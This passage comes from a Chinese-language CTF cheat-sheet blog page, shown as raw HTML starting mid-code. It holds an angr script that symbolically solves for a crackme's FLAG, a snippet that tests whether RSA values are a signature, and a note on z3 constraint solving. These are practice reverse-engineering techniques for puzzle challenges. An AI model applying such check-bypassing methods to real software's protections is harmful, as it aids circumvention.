</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">39</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">if</span><span style="--0:#E1E4E8;--1:#24292E"> simulation.found:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">40</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">for</span><span style="--0:#E1E4E8;--1:#24292E"> s </span><span style="--0:#F97583;--1:#BF3441">in</span><span style="--0:#E1E4E8;--1:#24292E"> simulation.found:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">41</div></div><div class="code"><span class="indent">    </span><span style="--0:#99A0A6;--1:#616972"># 输出 stdin 的内容</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">42</div></div><div class="code"><span class="indent">        </span><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"input:"</span><span style="--0:#E1E4E8;--1:#24292E">, s.posix.dumps(</span><span style="--0:#79B8FF;--1:#005CC5">0</span><span style="--0:#E1E4E8;--1:#24292E">))</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">43</div></div><div class="code"><span class="indent">    </span><span style="--0:#99A0A6;--1:#616972"># 输出程序 stdout</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">44</div></div><div class="code"><span class="indent">        </span><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"output:"</span><span style="--0:#E1E4E8;--1:#24292E">, s.posix.dumps(</span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">))</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">45</div></div><div class="code"><span class="indent">    </span><span style="--0:#99A0A6;--1:#616972"># 输出达到 is_successful 条件的 FLAG 值</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">46</div></div><div class="code"><span class="indent">        </span><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(s.solver.eval(flag, </span><span style="--0:#FFAB70;--1:#AE4B07">cast_to</span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#79B8FF;--1:#005CC5">bytes</span><span style="--0:#E1E4E8;--1:#24292E">).decode())</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">47</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">else</span><span style="--0:#E1E4E8;--1:#24292E">:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">48</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">raise</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">Exception</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">'Could not find the solution'</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="import angrimport sysimport claripydef is_successful(state):    global flag    # 检查 stdout 有没有 Well Done 字段    return b&#x27;Well Done&#x27; in state.posix.dumps(1)def should_abort(state):    # 检查控制台 stdout 有没有 Nope 字段    return b&#x27;Nope&#x27; in state.posix.dumps(1)# 加载二进制文件, 当我们分析的二进制没有受外部库显著的影响时, 可以关掉 auto_load_libsproject = angr.Project(&#x22;F:/Downloads/homework_help&#x22;, auto_load_libs = False)print(project.loader.find_symbol(&#x22;__stack_chk_fail&#x22;).rebased_addr)# 从这个方法开始执行state = project.factory.blank_state(addr=project.loader.find_symbol(&#x22;__stack_chk_fail&#x22;).rebased_addr)# 把 FLAG 变量当作一个 solver 的变量, 我们目的就是让 Angr 构造一个合适的 FLAG 来达到 is_successful 条件# 第一个是自定义名字, 可以随意, 第二个参数是长度, 通过 Ghidra 可以看到程序中为 32 bytes 长, 也就是 32 * 8 bits 长flag = state.solver.BVS(&#x27;FLAG&#x27;, 32 * 8)# FLAG addrprint(project.loader.find_symbol(&#x22;FLAG&#x22;).rebased_addr)# 把 FLAG 填充到全局 FLAG 符号的内存位置里state.memory.store(project.loader.find_symbol(&#x22;FLAG&#x22;).rebased_addr, flag)# 构造一个模拟器simulation = project.factory.simulation_manager(state)# 优化用的, 去掉也没事应该simulation.one_active.options.add(angr.options.LAZY_SOLVES)# 这里同时用 puts(&#x22;Well Done.&#x22;) 和 puts(&#x22;Nope.&#x22;) 本身的地址和控制台输出检查作为 find 条件, 实际上可以只使用一个simulation.explore(find=[is_successful, 0x004013f5] , avoid=[should_abort, 0x401414])for deadended in simulation.deadended:    print(&#x22;Valid memory access triggered by %s&#x22; % repr(deadended.posix.dumps(0)))for errored in simulation.errored:    print(&#x22;%s caused by %s&#x22; % (errored.error, repr(errored.state.posix.dumps(0))))if simulation.found:    for s in simulation.found:    # 输出 stdin 的内容        print(&#x22;input:&#x22;, s.posix.dumps(0))    # 输出程序 stdout        print(&#x22;output:&#x22;, s.posix.dumps(1))    # 输出达到 is_successful 条件的 FLAG 值        print(s.solver.eval(flag, cast_to=bytes).decode())else:    raise Exception(&#x27;Could not find the solution&#x27;)"><div></div></button></div></figure></div>
<h2 id="rsa"><a class="not-prose" href="#rsa">RSA</a></h2>
<p>遇到给出 N, E 和 C 的情况, 应该能确认是 RSA 了.<br>
这个时候要确认是 RSA 加密还是签名, 不然可能会和我一样浪费几个小时在 RsaCtfTool 和 yafu 上面 (x)<br>
可以在开始尝试解密的时候用</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:32ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">import</span><span style="--0:#E1E4E8;--1:#24292E"> Crypto.Util.number </span><span style="--0:#F97583;--1:#BF3441">as</span><span style="--0:#E1E4E8;--1:#24292E"> cun</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">n </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#99A0A6;--1:#616972">#</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">e </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#99A0A6;--1:#616972">#</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">c </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#99A0A6;--1:#616972">#</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">p </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">pow</span><span style="--0:#E1E4E8;--1:#24292E">(c, e, n)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(cun.long_to_bytes(p))</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="import Crypto.Util.number as cunn = #e = #c = #p = pow(c, e, n)print(cun.long_to_bytes(p))"><div></div></button></div></figure></div>
<p>看看是不是签名, 然后再尝试解密.</p>
<h2 id="z3-solver"><a class="not-prose" href="#z3-solver">Z3 solver</a></h2>
<p>z3 solver 的 python 库可以用来求解约束.<br>
比如在 <a href="https://github.com/Nambers/ctf-writeups/blob/main/hack-a-sat-qual-2023/based_emoji%20(late)/solve.md" rel="noreferrer noopener" target="_blank">hack-a-sat 里面有一个chal</a>是每个表情代表一个 32 以内的数字, 然后给出每个数字的因子和其他的一些条件, 这个时候就可以用 z3 solver 创建一系列变量然后给他们添加chal里给出的条件, 然后求解得到每一个的对应值.</p>   </div> </div> </article> <button class="hover:border-link fixed end-4 bottom-8 z-90 flex h-10 w-10 translate-y-28 cursor-pointer items-center justify-center rounded-full border-2 border-transparent bg-zinc-200 text-3xl opacity-0 transition-all transition-discrete duration-300 data-[show=true]:translate-y-0 data-[show=true]:opacity-100 sm:end-8 sm:h-12 sm:w-12 dark:bg-zinc-700" data-show="false" id="to-top-btn"> <span class="sr-only">Back to top</span> <svg aria-hidden="true" class="h-6 w-6" fill="none" focusable="false" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"> <path d="M4.5 15.75l7.5-7.5 7.5 7.5" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </button>  </main> <footer class="mt-auto flex w-full flex-col items-center justify-center gap-y-2 pt-20 pb-4 text-center align-top font-semibold text-gray-600 sm:flex-row sm:justify-between sm:text-xs dark:text-gray-400"> <div class="me-0 text-neutral-400 sm:me-4">
&copy; <span class="text-accent">Eritque Arcus</span> 2020-2025.<br> <span>Powered by <a href="https://astro.build" class="hover:text-gray-700 dark:hover:text-gray-200">Astro</a> & modified <a href="https://github.com/chrismwilliams/astro-theme-cactus" class="hover:text-gray-700 dark:hover:text-gray-200">cactus</a></span><br> <a href="https://icp.gov.moe/?keyword=20222242" class="flex justify-center gap-1 text-xs hover:text-gray-700 dark:hover:text-gray-200"> <img src="/images/moe-icon120.png" class="h-4 w-4" alt="萌ICP备图标">
萌ICP备20222242号
</a> </div> <nav aria-labelledby="footer_links" class="flex flex-wrap gap-x-2 sm:gap-x-0 sm:divide-x sm:divide-gray-500"> <p id="footer_links" class="sr-only">More on this site</p> <a class="hover:text-global-text px-4 py-2 hover:underline sm:py-0" href="/archive/"> Archive </a><a class="hover:text-global-text px-4 py-2 hover:underline sm:py-0" href="/about/"> About </a><a class="hover:text-global-text px-4 py-2 hover:underline sm:py-0" href="/math-notes/"> Notes </a><a class="hover:text-global-text px-4 py-2 hover:underline sm:py-0" href="/ctf-cheatsheet/"> CTF-QuickRef </a><a class="hover:text-global-text px-4 py-2 hover:underline sm:py-0" href="/music/"> Music </a><a class="hover:text-global-text px-4 py-2 hover:underline sm:py-0" href="https://photos.ikuyo.dev"> Photos </a> <a class="hover:text-global-text px-4 py-2 hover:underline sm:py-0" href="https://www.travellings.cn/go.html"> 开往 </a> </nav> <script defer src="https://4-um4m1.ikuyo.dev/script.js" data-website-id="34e0a647-a8e8-40a8-ad62-742e9d604413" data-domains="ikuyo.dev"></script> <script type="text/javascript">
		(() => {
			const name = "outbound-link-click";
			document.querySelectorAll("a").forEach((a) => {
				if (a.host !== window.location.host && !a.getAttribute("data-umami-event")) {
					a.setAttribute("data-umami-event", name);
					a.setAttribute("data-umami-event-url", a.href);
				}
			});
		})();
	</script> </footer> </body></html> <script type="module">const e=document.getElementById("to-top-btn"),n=document.getElementById("blog-hero");function c(t){t.forEach(o=>{e.dataset.show=(!o.isIntersecting).toString()})}e.addEventListener("click",()=>{document.documentElement.scrollTo({behavior:"smooth",top:0})});const r=new IntersectionObserver(c);r.observe(n);</script>